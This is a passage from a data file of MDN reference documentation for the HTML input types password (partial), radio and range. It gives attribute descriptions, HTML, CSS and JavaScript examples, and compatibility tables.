number\n\nThis example only accepts input which matches the format for a [valid United States Social Security Number](https://en.wikipedia.org/wiki/Social_Security_number#Structure). These numbers, used for tax and identification purposes in the US, are in the form \"123-45-6789\". Assorted rules for what values are permitted in each group exist as well.\n\n#### HTML\n\nhtml\n\n```\n<label for=\"ssn\">SSN:</label>\n<input\n  type=\"password\"\n  id=\"ssn\"\n  inputmode=\"numeric\"\n  minlength=\"9\"\n  maxlength=\"12\"\n  pattern=\"(?!000)([0-6]\\d{2}|7([0-6]\\d|7[012]))([ -])?(?!00)\\d\\d\\3(?!0000)\\d{4}\"\n  required\n  autocomplete=\"off\" />\n<br />\n<label for=\"ssn\">Value:</label>\n<span id=\"current\"></span>\n```\n\nThis uses a [`pattern`](../input#pattern) which limits the entered value to strings representing legal Social Security numbers. Obviously, this regexp doesn't guarantee a valid SSN (since we don't have access to the Social Security Administration's database), but it does ensure the number could be one; it generally avoids values that cannot be valid. In addition, it allows the three groups of digits to be separated by a space, a dash (\"-\"), or nothing.\n\nThe [`inputmode`](../input#inputmode) is set to `numeric` to encourage devices with virtual keyboards to switch to a numeric keypad layout for easier entry. The [`minlength`](../input#minlength) and [`maxlength`](../input#maxlength) attributes are set to 9 and 12, respectively, to require that the value be at least nine and no more than 12 characters (the former without separating characters between the groups of digits and the latter with them). The [`required`](../input#required) attribute is used to indicate that this control must have a value. Finally, [`autocomplete`](../input#autocomplete) is set to `off` to avoid password managers and session restore features trying to set its value, since this isn't a password at all.\n\n#### JavaScript\n\nThis is just some simple code to display the entered SSN onscreen so you can see it. Obviously this defeats the purpose of a password field, but it's helpful for experimenting with the `pattern`.\n\njs\n\n```\nconst ssn = document.getElementById(\"ssn\");\nconst current = document.getElementById(\"current\");\n\nssn.oninput = (event) => {\n  current.textContent = ssn.value;\n};\n```\n\n#### Result\n\n## Technical summary\n\n|                                 |                                                                                                                                                                                                                                                                                                                       |\n|---------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| **[Value](#value)**             | A string representing a password, or empty                                                                                                                                                                                                                                                                            |\n| **Events**                      | [`change`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event) and [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event)                                                                                                                                             |\n| **Supported Common Attributes** | [`autocomplete`](../input#autocomplete), [`inputmode`](../input#inputmode), [`maxlength`](../input#maxlength), [`minlength`](../input#minlength), [`pattern`](../input#pattern), [`placeholder`](../input#placeholder), [`readonly`](../input#readonly), [`required`](../input#required), and [`size`](../input#size) |\n| **IDL attributes**              | `selectionStart`, `selectionEnd`, `selectionDirection`, and `value`                                                                                                                                                                                                                                                   |\n| **DOM interface**               | [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)                                                                                                                                                                                                                               |\n| **Methods**                     | [`select()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/select), [`setRangeText()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/setRangeText), and [`setSelectionRange()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/setSelectionRange)          |\n| **Implicit ARIA Role**          | [no corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                                                                                                                                                                   |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|                           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `password`                | 1       | 12   | 1       | 2     | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n| `insecure_login_handling` | No      | No   | 52      | No    | No     | No             | 52                  | No            | No            | No               | No              |     |\n\n## See also\n\n- [Compatibility of CSS properties](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/password](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/password)"
- name: input type="radio"
  summary: <input> elements of type radio are generally used in radio groups—collections of radio buttons describing a set of related options
  description: "# \\<input type=\"radio\"\\>\n\n[`<input>`](../input) elements of type `radio` are generally used in **radio groups**—collections of radio buttons describing a set of related options.\n\nOnly one radio button in a given group can be selected at the same time. Radio buttons are typically rendered as small circles, which are filled or highlighted when selected.\n\n## Try it\n\n#### HTML Demo: \\<input type=\"radio\"\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <fieldset>\n      <legend>Select a maintenance drone:</legend>\n\n      <div>\n        <input type=\"radio\" id=\"huey\" name=\"drone\" value=\"huey\" checked />\n        <label for=\"huey\">Huey</label>\n      </div>\n\n      <div>\n        <input type=\"radio\" id=\"dewey\" name=\"drone\" value=\"dewey\" />\n        <label for=\"dewey\">Dewey</label>\n      </div>\n\n      <div>\n        <input type=\"radio\" id=\"louie\" name=\"drone\" value=\"louie\" />\n        <label for=\"louie\">Louie</label>\n      </div>\n    </fieldset>\n\n    p,\n    label {\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n    }\n\n    input {\n      margin: 0.4rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nThey are called radio buttons because they look and operate in a similar manner to the push buttons on old-fashioned radios, such as the one shown below.\n\n**Note:** [Checkboxes](checkbox) are similar to radio buttons, but with an important distinction: radio buttons are designed for selecting one value out of a set, whereas checkboxes let you turn individual values on and off. Where multiple controls exist, radio buttons allow one to be selected out of them all, whereas checkboxes allow multiple values to be selected.\n\n## Value\n\nThe `value` attribute is a string containing the radio button's value. The value is never shown to the user by their [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent). Instead, it's used to identify which radio button in a group is selected.\n\n### Defining a radio group\n\nA radio group is defined by giving each of radio buttons in the group the same [`name`](../input#name). Once a radio group is established, selecting any radio button in that group automatically deselects any currently-selected radio button in the same group.\n\nYou can have as many radio groups on a page as you like, as long as each has its own unique `name`.\n\nFor example, if your form needs to ask the user for their preferred contact method, you might create three radio buttons, each with the `name` property set to `contact` but one with the value `email`, one with the value `phone`, and one with the value `mail`. The user never sees the `value` or the `name` (unless you expressly add code to display it).\n\nThe resulting HTML looks like this:\n\nhtml\n\n```\n<form>\n  <fieldset>\n    <legend>Please select your preferred contact method:</legend>\n    <div>\n      <input type=\"radio\" id=\"contactChoice1\" name=\"contact\" value=\"email\" />\n      <label for=\"contactChoice1\">Email</label>\n\n      <input type=\"radio\" id=\"contactChoice2\" name=\"contact\" value=\"phone\" />\n      <label for=\"contactChoice2\">Phone</label>\n\n      <input type=\"radio\" id=\"contactChoice3\" name=\"contact\" value=\"mail\" />\n      <label for=\"contactChoice3\">Mail</label>\n    </div>\n    <div>\n      <button type=\"submit\">Submit</button>\n    </div>\n  </fieldset>\n</form>\n```\n\nHere you see the three radio buttons, each with the `name` set to `contact` and each with a unique `value` that uniquely identifies that individual radio button within the group. They each also have a unique [`id`](https://developer.mozilla.org/en-US/docs/Web/API/Element/id), which is used by the [`<label>`](../label) element's [`for`](../label#for) attribute to associate the labels with the radio buttons.\n\nYou can try out this example here:\n\n### Data representation of a radio group\n\nWhen the above form is submitted with a radio button selected, the form's data includes an entry in the form `contact=value`. For example, if the user clicks on the \"Phone\" radio button then submits the form, the form's data will include the line `contact=phone`.\n\nIf you omit the `value` attribute in the HTML, the submitted form data assigns the value `on` to the group. In this scenario, if the user clicked on the \"Phone\" option and submitted the form, the resulting form data would be `contact=on`, which isn't helpful. So don't forget to set your `value` attributes!\n\n**Note:** If no radio button is selected when the form is submitted, the radio group is not included in the submitted form data at all, since there is no value to report.\n\nIt's fairly uncommon to actually want to allow the form to be submitted without any of the radio buttons in a group selected, so it is usually wise to have one default to the `checked` state. See [Selecting a radio button by default](#selecting_a_radio_button_by_default) below.\n\nLet's add a bit of code to our example so we can examine the data generated by this form. The HTML is revised to add a [`<pre>`](../pre) block to output the form data into:\n\nhtml\n\n```\n<form>\n  <fieldset>\n    <legend>Please select your preferred contact method:</legend>\n    <div>\n      <input type=\"radio\" id=\"contactChoice1\" name=\"contact\" value=\"email\" />\n      <label for=\"contactChoice1\">Email</label>\n      <input type=\"radio\" id=\"contactChoice2\" name=\"contact\" value=\"phone\" />\n      <label for=\"contactChoice2\">Phone</label>\n      <input type=\"radio\" id=\"contactChoice3\" name=\"contact\" value=\"mail\" />\n      <label for=\"contactChoice3\">Mail</label>\n    </div>\n    <div>\n      <button type=\"submit\">Submit</button>\n    </div>\n  </fieldset>\n</form>\n<pre id=\"log\"></pre>\n```\n\nThen we add some [JavaScript](https://developer.mozilla.org/en-US/docs/Web/JavaScript) to set up an event listener on the [`submit`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/submit_event) event, which is sent when the user clicks the \"Submit\" button:\n\njs\n\n```\nconst form = document.querySelector(\"form\");\nconst log = document.querySelector(\"#log\");\n\nform.addEventListener(\n  \"submit\",\n  (event) => {\n    const data = new FormData(form);\n    let output = \"\";\n    for (const entry of data) {\n      output = `${output}${entry[0]}=${entry[1]}\\r`;\n    }\n    log.innerText = output;\n    event.preventDefault();\n  },\n  false,\n);\n```\n\nTry this example out and see how there's never more than one result for the `contact` group.\n\n## Additional attributes\n\nIn addition to the common attributes shared by all [`<input>`](../input) elements, `radio` inputs support the following attributes.\n\n[`checked`](#checked)  \nA Boolean attribute which, if present, indicates that this radio button is the default selected one in the group.\n\nUnlike other browsers, Firefox by default [persists the dynamic checked state](https://stackoverflow.com/questions/5985839/bug-with-firefox-disabled-attribute-of-input-not-resetting-when-refreshing) of an `<input>` across page loads. Use the [`autocomplete`](../input#autocomplete) attribute to control this feature.\n\n[`value`](#value_2)  \nThe `value` attribute is one which all [`<input>`](../input)s share; however, it serves a special purpose for inputs of type `radio`: when a form is submitted, only radio buttons which are currently checked are submitted to the server, and the reported value is the value of the `value` attribute. If the `value` is not otherwise specified, it is the string `on` by default. This is demonstrated in the section [Value](#value) above.\n\n[`required`](../../attributes/required)  \nThe `required` attribute is one which most [`<input>`](../input)s share. If any radio button in a same-named group of radio buttons has the `required` attribute, a radio button in that group must be checked, although it doesn't have to be the one with the attribute applied.\n\n## Using radio inputs\n\nWe already covered the fundamentals of radio buttons above. Let's now look at the other common radio-button-related features and techniques you may need to know about.\n\n### Selecting a radio button by default\n\nTo make a radio button selected by default, you include `checked` attribute, as shown in this revised version of the previous example:\n\nhtml\n\n```\n<form>\n  <fieldset>\n    <legend>Please select your preferred contact method:</legend>\n    <div>\n      <input\n        type=\"radio\"\n        id=\"contactChoice1\"\n        name=\"contact\"\n        value=\"email\"\n        checked />\n      <label for=\"contactChoice1\">Email</label>\n\n      <input type=\"radio\" id=\"contactChoice2\" name=\"contact\" value=\"phone\" />\n      <label for=\"contactChoice2\">Phone</label>\n\n      <input type=\"radio\" id=\"contactChoice3\" name=\"contact\" value=\"mail\" />\n      <label for=\"contactChoice3\">Mail</label>\n    </div>\n    <div>\n      <button type=\"submit\">Submit</button>\n    </div>\n  </fieldset>\n</form>\n```\n\nIn this case, the first radio button is now selected by default.\n\n**Note:** If you put the `checked` attribute on more than one radio button, later instances will override earlier ones; that is, the last `checked` radio button will be the one that is selected. This is because only one radio button in a group can ever be selected at once, and the user agent automatically deselects others each time a new one is marked as checked.\n\n### Providing a bigger hit area for your radio buttons\n\nIn the above examples, you may have noticed that you can select a radio button by clicking on its associated [`<label>`](../label) element, as well as on the radio button itself. This is a really useful feature of HTML form labels that makes it easier for users to click the option they want, especially on small-screen devices like smartphones.\n\nBeyond accessibility, this is another good reason to properly set up `<label>` elements on your forms.\n\n## Validation\n\nIn the case of a radio button with the [`required`](../../attributes/required) attribute set, or a same-named group of radio buttons in which at least one member has `required` set, a radio button needs to be selected for the control to be considered valid. If no radio button is checked, the [`valueMissing`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/valueMissing) property of a [`ValidityState`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState) object will return `true` during validation, and the browser will ask the user to select an option.\n\n## Styling radio inputs\n\nThe following example shows a slightly more thorough version of the example we've seen throughout the article, with some additional styling, and with better semantics established through use of specialized elements. The HTML looks like this:\n\nhtml\n\n```\n<form>\n  <fieldset>\n    <legend>Please select your preferred contact method:</legend>\n    <div>\n      <input\n        type=\"radio\"\n        id=\"contactChoice1\"\n        name=\"contact\"\n        value=\"email\"\n        checked />\n      <label for=\"contactChoice1\">Email</label>\n\n      <input type=\"radio\" id=\"contactChoice2\" name=\"contact\" value=\"phone\" />\n      <label for=\"contactChoice2\">Phone</label>\n\n      <input type=\"radio\" id=\"contactChoice3\" name=\"contact\" value=\"mail\" />\n      <label for=\"contactChoice3\">Mail</label>\n    </div>\n    <div>\n      <button type=\"submit\">Submit</button>\n    </div>\n  </fieldset>\n</form>\n```\n\nThe CSS involved in this example is a bit more significant:\n\ncss\n\n```\nhtml {\n  font-family: sans-serif;\n}\n\ndiv:first-of-type {\n  display: flex;\n  align-items: flex-start;\n  margin-bottom: 5px;\n}\n\nlabel {\n  margin-right: 15px;\n  line-height: 32px;\n}\n\ninput {\n  appearance: none;\n\n  border-radius: 50%;\n  width: 16px;\n  height: 16px;\n\n  border: 2px solid #999;\n  transition: 0.2s all linear;\n  margin-right: 5px;\n\n  position: relative;\n  top: 4px;\n}\n\ninput:checked {\n  border: 6px solid black;\n}\n\nbutton,\nlegend {\n  color: white;\n  background-color: black;\n  padding: 5px 10px;\n  border-radius: 0;\n  border: 0;\n  font-size: 14px;\n}\n\nbutton:hover,\nbutton:focus {\n  color: #999;\n}\n\nbutton:active {\n  background-color: white;\n  color: black;\n  outline: 1px solid black;\n}\n```\n\nMost notable here is the use of the [`appearance`](https://developer.mozilla.org/en-US/docs/Web/CSS/appearance) property (with prefixes needed to support some browsers). By default, radio buttons (and [checkboxes](checkbox)) are styled with the operating system's native styles for those controls. By specifying `appearance: none`, you can remove the native styling altogether, and create your own styles for them. Here we've used a [`border`](https://developer.mozilla.org/en-US/docs/Web/CSS/border) along with [`border-radius`](https://developer.mozilla.org/en-US/docs/Web/CSS/border-radius) and a [`transition`](https://developer.mozilla.org/en-US/docs/Web/CSS/transition) to create a nice animating radio selection. Notice also how the [`:checked`](https://developer.mozilla.org/en-US/docs/Web/CSS/:checked) pseudo-class is used to specify the styles for the radio button's appearance when selected.\n\n**Note:** If you wish to use the [`appearance`](https://developer.mozilla.org/en-US/docs/Web/CSS/appearance) property, you should test it very carefully. Although it is supported in most modern browsers, its implementation varies widely. In older browsers, even the keyword `none` does not have the same effect across different browsers, and some do not support it at all. The differences are smaller in the newest browsers.\n\nNotice that when clicking on a radio button, there's a nice, smooth fade out/in effect as the two buttons change state. In addition, the style and coloring of the legend and submit button are customized to have strong contrast. This might not be a look you'd want in a real web application, but it definitely shows off the possibilities.\n\n## Technical summary\n\n|                                 |                                                                                                                                                                           |\n|---------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| **[Value](#value)**             | A string representing the value of the radio button.                                                                                                                      |\n| **Events**                      | [`change`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event) and [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event) |\n| **Supported common attributes** | [`checked`](#checked), [`value`](#value) and [`required`](../../attributes/required)                                                                                      |\n| **IDL attributes**              | `checked` and `value`                                                                                                                                                     |\n| **DOM interface**               | [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)                                                                                   |\n| **Methods**                     | [`select()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/select)                                                                                    |\n| **Implicit ARIA Role**          | [`radio`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/radio_role)                                                                               |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|         | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|         | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `radio` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n## See also\n\n- [`<input>`](../input) and the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) interface that implements it.\n- [`RadioNodeList`](https://developer.mozilla.org/en-US/docs/Web/API/RadioNodeList): the interface that describes a list of radio buttons\n- [Compatibility of CSS properties](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/radio](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/radio)"
- name: input type="range"
  summary: <input> elements of type range let the user specify a numeric value which must be no less than a given value, and no more than another given value
  description: "# \\<input type=\"range\"\\>\n\n[`<input>`](../input) elements of type `range` let the user specify a numeric value which must be no less than a given value, and no more than another given value. The precise value, however, is not considered important. This is typically represented using a slider or dial control rather than a text entry box like the [number](number) input type.\n\nBecause this kind of widget is imprecise, it should only be used if the control's exact value isn't important.\n\n## Try it\n\n#### HTML Demo: \\<input type=\"range\"\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>Audio settings:</p>\n\n    <div>\n      <input type=\"range\" id=\"volume\" name=\"volume\" min=\"0\" max=\"11\" />\n      <label for=\"volume\">Volume</label>\n    </div>\n\n    <div>\n      <input type=\"range\" id=\"cowbell\" name=\"cowbell\" min=\"0\" max=\"100\" value=\"90\" step=\"10\" />\n      <label for=\"cowbell\">Cowbell</label>\n    </div>\n\n    p,\n    label {\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n    }\n\n    input {\n      margin: 0.4rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nIf the user's browser doesn't support type `range`, it will fall back and treat it as a [`text`](text) input.\n\n### Validation\n\nThere is no pattern validation available; however, the following forms of automatic validation are performed:\n\n- If the [`value`](../input#value) is set to something which can't be converted into a valid floating-point number, validation fails because the input is suffering from a bad input.\n- The value won't be less than [`min`](../input#min). The default is 0.\n- The value won't be greater than [`max`](../input#max). The default is 100.\n- The value will be a multiple of [`step`](../input#step). The default is 1.\n\n### Value\n\nThe [`value`](../input#value) attribute contains a string which contains a string representation of the selected number. The value is never an empty string (`\"\"`). The default value is halfway between the specified minimum and maximum—unless the maximum is actually less than the minimum, in which case the default is set to the value of the `min` attribute. The algorithm for determining the default value is:\n\njs\n\n```\ndefaultValue =\n  rangeElem.max < rangeElem.min\n    ? rangeElem.min\n    : rangeElem.min + (rangeElem.max - rangeElem.min) / 2;\n```\n\nIf an attempt is made to set the value lower than the minimum, it is set to the minimum. Similarly, an attempt to set the value higher than the maximum results in it being set to the maximum.\n\n## Additional attributes\n\nIn addition to the attributes shared by all [`<input>`](../input) elements, range inputs offer the following attributes.\n\n**Note:** The following input attributes do not apply to the input range: `accept`, `alt`, `checked`, `dirname`, `formaction`, `formenctype`, `formmethod`, `formnovalidate`, `formtarget`, `height`, `maxlength`, `minlength`, `multiple`, `pattern`, `placeholder`, `readonly`, `required`, `size`, and `src`. Any of these attributes, if included, will be ignored.\n\n### list\n\nThe value of the `list` attribute is the [`id`](https://developer.mozilla.org/en-US/docs/Web/API/Element/id) of a [`<datalist>`](../datalist) element located in the same document. The [`<datalist>`](../datalist) provides a list of predefined values to suggest to the user for this input. Any values in the list that are not compatible with the [`type`](../input#type) are not included in the suggested options. The values provided are suggestions, not requirements: users can select from this predefined list or provide a different value.\n\nSee the [adding tick marks](#adding_tick_marks) below for an example of how the options on a range are denoted in supported browsers.\n\n### max\n\nThe greatest value in the range of permitted values. If the [`value`](../input#value) entered into the element exceeds this, the element fails [constraint validation](../../constraint_validation). If the value of the [`max`](../../attributes/max) attribute isn't a number, then the element has no maximum value.\n\nThis value must be greater than or equal to the value of the [`min`](../../attributes/min) attribute. See the HTML [`max`](../../attributes/max) attribute.\n\n### min\n\nThe lowest value in the range of permitted values. If the [`value`](../input#value) of the element is less than this, the element fails [constraint validation](../../constraint_validation). If a value is specified for `min` that isn't a valid number, the input has no minimum value.\n\nThis value must be less than or equal to the value of the [`max`](../../attributes/max) attribute. See the HTML [`min`](../../attributes/min) attribute.\n\n**Note:** If the `min` and `max` values are equal or the `max` value is lower than the `min` value the user will not be able to interact with the range.\n\n### step\n\nThe `step` attribute is a number that specifies the granularity that the value must adhere to. Only values that match the specified stepping interval ([`min`](#min) if specified, [`value`](../input#value) otherwise, or an appropriate default value if neither of those is provided) are valid.\n\nThe `step` attribute can also be set to the `any` string value. This `step` value means that no stepping interval is implied and any value is allowed in the specified range (barring other constraints, such as [`min`](#min) and [`max`](#max)). See the [Setting step to the `any` value](#setting_step_to_any) example for how this works in supported browsers.\n\n**Note:** When the value entered by a user doesn't adhere to the stepping configuration, the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) may round off the value to the nearest valid value, preferring to round numbers up when there are two equally close options.\n\nThe default stepping value for `range` inputs is 1, allowing only integers to be entered, *unless* the stepping base is not an integer; for example, if you set `min` to -10 and `value` to 1.5, then a `step` of 1 will allow only values such as 1.5, 2.5, 3.5,… in the positive direction and -0.5, -1.5, -2.5,… in the negative direction. See the [HTML `step` attribute](../../attributes/step).\n\n## Non-standard attributes\n\n### orient\n\nSimilar to the -moz-orient non-standard CSS property impacting the [`<progress>`](../progress) and [`<meter>`](../meter) elements, the `orient` attribute defines the orientation of the range slider. Values include `horizontal`, meaning the range is rendered horizontally, and `vertical`, where the range is rendered vertically.\n\n## Examples\n\nWhile the `number` type lets users enter a number with optional constraints forcing their value to be between a minimum and a maximum value, it does require that they enter a specific value. The `range` input type lets you ask the user for a value in cases where the user may not even care—or know—what the specific numeric value selected is.\n\nA few examples of situations in which range inputs are commonly used:\n\n- Audio controls such as volume and balance, or filter controls.\n- Color configuration controls such as color channels, transparency, brightness, etc.\n- Game configuration controls such as difficulty, visibility distance, world size, and so forth.\n- Password length for a password manager's generated passwords.\n\nAs a rule, if the user is more likely to be interested in the percentage of the distance between minimum and maximum values than the actual number itself, a range input is a great candidate. For example, in the case of a home stereo volume control, users typically think \"set volume at halfway to maximum\" instead of \"set volume to 0.5\".\n\n### Specifying the minimum and maximum\n\nBy default, the minimum is 0 and the maximum is 100. If that's not what you want, you can easily specify different bounds by changing the values of the [`min`](../input#min) and/or [`max`](../input#max) attributes. These can be any floating-point value.\n\nFor example, to ask the user for a value between -10 and 10, you can use:\n\nhtml\n\n```\n<input type=\"range\" min=\"-10\" max=\"10\" />\n```\n\n### Setting the value's granularity\n\nBy default, the granularity is 1, meaning the value is always an integer. To control the granularity, you can change the [`step`](../input#step) attribute. For example, If you need a value to be halfway between 5 and 10, you should set the value of `step` to 0.5:\n\n#### Setting the step attribute\n\nhtml\n\n```\n<input type=\"range\" min=\"5\" max=\"10\" step=\"0.5\" />\n```\n\n#### Setting step to `any`\n\nIf you want to accept any value regardless of how many decimal places it extends to, you can specify a value of `any` for the [`step`](../input#step) attribute:\n\n##### HTML\n\nhtml\n\n```\n<input id=\"pi_input\" type=\"range\" min=\"0\" max=\"3.14\" step=\"any\" />\n<p>Value: <output id=\"value\"></output></p>\n```\n\n##### JavaScript\n\njs\n\n```\nconst value = document.querySelector(\"#value\");\nconst input = document.querySelector(\"#pi_input\");\nvalue.textContent = input.value;\ninput.addEventListener(\"input\", (event) => {\n  value.textContent = event.target.value;\n});\n```\n\nThis example lets the user select any value between 0 and π without any restriction on the fractional part of the value selected. JavaScript is used to show how the value changes as the user interacts with the range.\n\n### Adding tick marks\n\nTo add tick marks to a range control, include the `list` attribute, giving it the `id` of a [`<datalist>`](../datalist) element which defines a series of tick marks on the control. Each point is represented using an [`<option>`](../option) element with its [`value`](../option#value) set to the range's value at which a mark should be drawn.\n\n#### HTML\n\nhtml\n\n```\n<label for=\"temp\">Choose a comfortable temperature:</label><br />\n<input type=\"range\" id=\"temp\" name=\"temp\" list=\"markers\" />\n\n<datalist id=\"markers\">\n  <option value=\"0\"></option>\n  <option value=\"25\"></option>\n  <option value=\"50\"></option>\n  <option value=\"75\"></option>\n  <option value=\"100\"></option>\n</datalist>\n```\n\n#### Result\n\n### Using the same datalist for multiple range controls\n\nTo help you from repeating code you can reuse that same [`<datalist>`](../datalist) for multiple `<input type=\"range\">` elements, and other [`<input>`](../input) types.\n\n**Note:** If you also want to [show the labels](#adding_labels) as in the example below then you would need a `datalist` for each range input.\n\n#### HTML\n\nhtml\n\n```\n<p>\n  <label for=\"temp1\">Temperature for room 1:</label>\n  <input type=\"range\" id=\"temp1\" name=\"temp1\" list=\"values\" />\n</p>\n<p>\n  <label for=\"temp2\">Temperature for room 2:</label>\n  <input type=\"range\" id=\"temp2\" name=\"temp2\" list=\"values\" />\n</p>\n\n<p>\n  <label for=\"temp3\">Temperature for room 3:</label>\n  <input type=\"range\" id=\"temp3\" name=\"temp3\" list=\"values\" />\n</p>\n\n<datalist id=\"values\">\n  <option value=\"0\" label=\"0\"></option>\n  <option value=\"25\" label=\"25\"></option>\n  <option value=\"50\" label=\"50\"></option>\n  <option value=\"75\" label=\"75\"></option>\n  <option value=\"100\" label=\"100\"></option>\n</datalist>\n```\n\n#### Result\n\n### Adding labels\n\nYou can label tick marks by giving the `<option>` elements `label` attributes. However, the label content will not be displayed by default. You can use CSS to show the labels and to position them correctly. Here's one way you could do this.\n\n#### HTML\n\nhtml\n\n```\n<label for=\"tempB\">Choose a comfortable temperature:</label><br />\n<input type=\"range\" id=\"tempB\" name=\"temp\" list=\"values\" />\n\n<datalist id=\"values\">\n  <option value=\"0\" label=\"very cold!\"></option>\n  <option value=\"25\" label=\"cool\"></option>\n  <option value=\"50\" label=\"medium\"></option>\n  <option value=\"75\" label=\"getting warm!\"></option>\n  <option value=\"100\" label=\"hot!\"></option>\n</datalist>\n```\n\n#### CSS\n\ncss\n\n```\ndatalist {\n  display: flex;\n  flex-direction: column;\n  justify-content: space-between;\n  writing-mode: vertical-lr;\n  width: 200px;\n}\n\noption {\n  padding: 0;\n}\n\ninput[type=\"range\"] {\n  width: 200px;\n  margin: 0;\n}\n```\n\n#### Result\n\n### Creating vertical range controls\n\nBy default, browsers render range inputs as sliders with the knob sliding left and right.\n\nTo create a vertical range wherein the thumb slides up and down, set the [`writing-mode`](https://developer.mozilla.org/en-US/docs/Web/CSS/writing-mode) property with a value of either `vertical-rl` or `vertical-lr`:\n\ncss\n\n```\ninput[type=\"range\"] {\n  writing-mode: vertical-lr;\n}\n```\n\nThis causes the range slider to render vertically:\n\nYou can also set the CSS [`appearance`](https://developer.mozilla.org/en-US/docs/Web/CSS/appearance) property to the non-standard `slider-vertical` value if you want to support older versions of Chrome and Safari, and include the non-standard `orient=\"vertical\"` attribute to support older versions of Firefox.\n\nSee [Creating vertical form controls](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_writing_modes/Vertical_controls) for examples.\n\n## Technical summary\n\n|                                 |                                                                                                                                                                                       |\n|---------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| **[Value](#value)**             | A string containing the string representation of the selected numeric value; use `valueAsNumber` to get the value as a number.                                                        |\n| **Events**                      | [`change`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event) and [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event)             |\n| **Supported common attributes** | [`autocomplete`](../input#autocomplete), [`list`](../input#list), [`max`](../input#max), [`min`](../input#min), [`step`](../input#step)                                               |\n| **IDL attributes**              | [`list`](../input#list), [`value`](../input#value), `valueAsNumber`                                                                                                                   |\n| **DOM interface**               | [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)                                                                                               |\n| **Methods**                     | [`stepDown()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/stepDown) and [`stepUp()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/stepUp) |\n| **Implicit ARIA Role**          | [`slider`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/slider_role)                                                                                         |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [HTML Forms](https://developer.mozilla.org/en-US/docs/Learn/Forms)\n- [`<input>`](../input) and the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) interface it's based upon\n- [`<input type=\"number\">`](number)\n- [`validityState.rangeOverflow`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/rangeOverflow) and [`validityState.rangeUnderflow`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/rangeUnderflow)\n- [Controlling multiple parameters with ConstantSourceNode](https://developer.mozilla.org/en-US/docs/Web/API/Web_Audio_API/Controlling_multiple_parameters_with_ConstantSourceNode)\n- [Creating vertical form controls](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_writing_modes/Vertical_controls)\n- [Styling the range element](https://css-tricks.com/sliding-nightmare-understanding-range-input/)\n- [Compatibility of CSS 